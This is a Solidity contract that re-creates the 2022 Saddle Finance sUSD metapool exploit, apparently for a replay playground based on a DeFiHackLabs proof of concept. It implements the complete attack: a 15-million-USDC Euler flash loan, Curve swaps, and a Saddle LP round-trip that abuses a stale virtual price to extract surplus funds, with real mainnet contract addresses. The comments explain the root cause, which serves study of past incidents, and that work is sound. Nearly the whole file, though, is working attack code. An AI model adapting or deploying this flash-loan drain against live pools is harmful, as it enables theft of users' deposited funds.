// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-04-Saddle).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract (the
// ERC-3156 flash-loan callback `onFlashLoan` lives on the test itself, so there
// is no standalone contract to deploy). This contract is a faithful, self-contained
// copy of that inline attack (testExploit + onFlashLoan + attack + swapToSaddle +
// swapFromSaddle) so the playground can deploy it and record run(). Logic and
// constants are copied verbatim from test/Saddle_exp.sol.
//
// Root cause: the Saddle sUSD V2 metapool prices its saddleUSDV2 LP token against
// a base-pool (Curve sUSD) virtual price that it does NOT re-read on each swap. A
// flash-loaned round-trip sUSD -> LP -> sUSD therefore returns MORE sUSD than was
// put in, because the LP virtual price used on the reverse leg has not reconciled
// with the move the first leg caused. Routed back through Curve to USDC, the
// surplus is realised as a hard profit.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IEuler {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external returns (bool);
}

interface ICurve {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface ISaddle {
    function swap(uint8 i, uint8 j, uint256 dx, uint256 min_dy, uint256 deadline) external returns (uint256);
}

contract SaddleMetaPoolDrain {
    address constant EULER_LOANS = 0x07df2ad9878F8797B4055230bbAE5C808b8259b3;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant SUSD = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
    address constant SADDLE_USD_V2 = 0x5f86558387293b6009d7896A61fcc86C17808D62;
    address constant CURVE_POOL = 0xA5407eAE9Ba41422680e2e00537571bcC53efBfD;
    address constant SADDLE_POOL = 0x824dcD7b044D60df2e89B1bB888e66D8BCf41491;

    // 15,000,000 USDC (6-dec) — sized to push the metapool + Curve base pool off peg.
    uint256 constant FLASH_AMOUNT = 15_000_000e6;

    // step 0: flash-borrow USDC from Euler (ERC-3156, 0 fee). The callback below
    // does the round-trip and repays.
    function run() external {
        IEuler(EULER_LOANS).flashLoan(address(this), USDC, FLASH_AMOUNT, new bytes(0));
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        attack();

        // Repay loan (Euler charges 0 fee).
        IERC20(USDC).approve(msg.sender, amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack() internal {
        // Leg 1: swap flash-loaned USDC -> sUSD via the Curve sUSD base pool.
        // index 1 = USDC, index 3 = sUSD.
        uint256 amount = IERC20(USDC).balanceOf(address(this));
        IERC20(USDC).approve(CURVE_POOL, amount);
        ICurve(CURVE_POOL).exchange(1, 3, amount, 1);

        // Legs 2 & 3: the metapool round-trip — sUSD -> saddleUSDV2 -> sUSD.
        swapToSaddle(IERC20(SUSD).balanceOf(address(this)));
        swapFromSaddle();

        // Leg 4: swap the surplus sUSD back to USDC via Curve.
        // index 3 = sUSD, index 1 = USDC.
        amount = IERC20(SUSD).balanceOf(address(this));
        IERC20(SUSD).approve(CURVE_POOL, amount);
        ICurve(CURVE_POOL).exchange(3, 1, amount, 1);
    }

    // Leg 2: sUSD -> saddleUSDV2 LP in the Saddle metapool. index 0 = sUSD, 1 = LP.
    function swapToSaddle(uint256 amountStart) internal {
        uint256 amount = amountStart;
        IERC20(SUSD).approve(SADDLE_POOL, amount);
        ISaddle(SADDLE_POOL).swap(0, 1, amount, 1, block.timestamp);
    }

    // Leg 3: saddleUSDV2 LP -> sUSD. Priced against a stale LP virtual price ->
    // returns MORE sUSD than leg 2 took in.
    function swapFromSaddle() internal {
        uint256 amount = IERC20(SADDLE_USD_V2).balanceOf(address(this));
        IERC20(SADDLE_USD_V2).approve(SADDLE_POOL, amount);
        ISaddle(SADDLE_POOL).swap(1, 0, amount, 1, block.timestamp);
    }
}
